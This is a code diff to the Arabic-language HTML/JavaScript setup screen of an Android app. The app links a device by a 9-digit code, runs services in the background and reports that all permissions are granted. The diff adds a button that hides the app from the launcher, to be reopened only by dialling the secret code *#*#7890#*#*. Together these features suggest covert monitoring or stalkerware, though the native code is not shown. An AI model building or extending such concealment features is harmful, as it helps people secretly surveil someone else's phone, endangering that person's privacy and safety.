@@ -9,7 +9,6 @@
         body { font-family: 'Tajawal', sans-serif; background-color: #0F172A; color: #E2E8F0; overflow-x: hidden; height: 100%; }
         .container { height: calc(100% - 80px); display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
         
-        /* أنماط شريط التشخيص */
         .diagnostic-bar {
             position: fixed; bottom: 0; left: 0; right: 0;
             background: rgba(0, 0, 0, 0.95); border-top: 1px solid #334155;
@@ -21,7 +20,6 @@
         .log-error { color: #f87171; }
         .log-info { color: #60a5fa; }
         
-        /* أنماط الواجهة */
         input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; border: none; text-align: center; font-size: 18px; background: #1E293B; color: white; border: 1px solid #334155; }
         input:focus { outline: none; border-color: #3b82f6; }
         button { width: 100%; padding: 15px; background: #3b82f6; color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; margin-top: 10px; transition: all 0.2s; }
@@ -52,12 +50,19 @@
                 <svg class="w-16 h-16 text-green-400 mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                 <p class="text-green-400 font-bold text-lg">تم الربط بنجاح!</p>
                 <p class="text-gray-400 text-xs mt-2 mb-4">النظام يعمل في الخلفية الآن.</p>
+                
                 <button onclick="handleStartServices()" class="bg-blue-600 text-sm py-2 px-4 rounded-lg">إعادة تشغيل الخدمات</button>
+                
+                <!-- زر الإخفاء الجديد -->
+                <button onclick="handleHideApp()" class="bg-red-700 text-sm py-3 px-4 rounded-lg mt-3 w-full">
+                    🚫 إخفاء التطبيق نهائياً
+                </button>
+                <p class="text-gray-500 text-[10px] mt-2">ملاحظة: سيختفي التطبيق من القائمة. لاستعادته ادخل الرمز: *#*#7890#*#*</p>
             </div>
         </div>
     </div>
 
-    <!-- === شريط التشخيص (Diagnostic Mode) === -->
+    <!-- Diagnostic Bar -->
     <div id="diag-box" class="diagnostic-bar">
         <span class="text-yellow-400 font-bold">[وضع الفحص الشامل]</span> جاري التهيئة...
     </div>
@@ -69,7 +74,6 @@
         const errorMsg = document.getElementById('error-msg');
         const btnLink = document.getElementById('btn-link');
 
-        // === دالة التسجيل (Logger) ===
         function log(msg, type = 'info') {
             const box = document.getElementById('diag-box');
             const time = new Date().toLocaleTimeString();
@@ -77,65 +81,46 @@
             if(type === 'error') colorClass = 'log-error';
             if(type === 'success') colorClass = 'log-success';
             if(type === 'info') colorClass = 'log-info';
-            
-            // تنظيف الرسالة الأولى
             if(box.innerText.includes('جاري التهيئة')) box.innerHTML = '';
-            
             box.innerHTML += `<span class="${colorClass}">[${time}] ${msg}</span>\n`;
             box.scrollTop = box.scrollHeight;
-            console.log(msg);
         }
 
-        // === الوظائف الرئيسية ===
-        
         document.addEventListener('DOMContentLoaded', () => {
             log('App DOM Loaded.', 'info');
-            validateNativeBridge();
-        });
-
-        function validateNativeBridge() {
             if(typeof AndroidNative !== 'undefined') {
-                log('✅ Native Bridge (AndroidNative) is READY.', 'success');
+                log('✅ Native Bridge Ready.', 'success');
             } else {
-                log('❌ ERROR: AndroidNative not found!', 'error');
+                log('❌ AndroidNative Missing.', 'error');
             }
-        }
+        });
 
         function handleLink() {
             const code = input.value.trim();
-            if(code.length < 9) {
-                showError('الكود يجب أن يكون 9 أرقام.');
-                log('Validation Failed: Code length < 9', 'error');
-                return;
-            }
-            
+            if(code.length < 9) { showError('الكود يجب أن يكون 9 أرقام.'); log('Invalid code length', 'error'); return; }
             hideError();
             btnLink.disabled = true;
             btnLink.innerText = "جاري الربط...";
-            log(`Attempting to link with code: ${code}`, 'info');
-            
+            log(`Linking with code: ${code}`, 'info');
             try {
-                if(typeof AndroidNative !== 'undefined') {
-                    AndroidNative.linkDevice(code);
-                } else {
-                    showError('خطأ داخلي: الكود غير جاهز');
-                    log('Native call failed.', 'error');
-                }
-            } catch(e) {
-                showError('استثناء: ' + e.message);
-                log('Exception: ' + e.message, 'error');
-            }
+                if(typeof AndroidNative !== 'undefined') AndroidNative.linkDevice(code);
+            } catch(e) { showError('استثناء: ' + e.message); log('Exception: ' + e.message, 'error'); }
         }
         
         function handleStartServices() {
-            log('Requesting service restart...', 'info');
+            log('Restarting services...', 'info');
             if(typeof AndroidNative !== 'undefined') AndroidNative.startServices();
         }
-        
-        // === Callbacks (يستدعيها Kotlin) ===
+
+        function handleHideApp() {
+            if(confirm('هل أنت متأكد؟ سيتم إخفاء التطبيق من القائمة. لفتحه مجدداً اطلب الرقم *#*#7890#*#* من لوحة الاتصال.')) {
+                log('Hiding application...', 'info');
+                if(typeof AndroidNative !== 'undefined') AndroidNative.hideApp();
+            }
+        }
         
         window.onLinkSuccess = function() {
-            log('✅ Link Success! Services should start.', 'success');
+            log('✅ Link Success!', 'success');
             linkSection.style.display = 'none';
             statusSection.classList.remove('hidden');
         };
@@ -147,18 +132,11 @@
             btnLink.innerText = "ربط الجهاز";
         };
 
-        window.onSetupComplete = function() {
-            log('✅ All Permissions Granted.', 'success');
-        };
+        window.onSetupComplete = function() { log('✅ All Permissions Granted.', 'success'); };
+        window.onAppHidden = function() { log('App Hidden Successfully!', 'success'); };
 
-        function showError(msg) {
-            errorMsg.innerText = msg;
-            errorMsg.classList.remove('hidden');
-        }
-
-        function hideError() {
-            errorMsg.classList.add('hidden');
-        }
+        function showError(msg) { errorMsg.innerText = msg; errorMsg.classList.remove('hidden'); }
+        function hideError() { errorMsg.classList.add('hidden'); }
     </script>
 </body>
 </html>
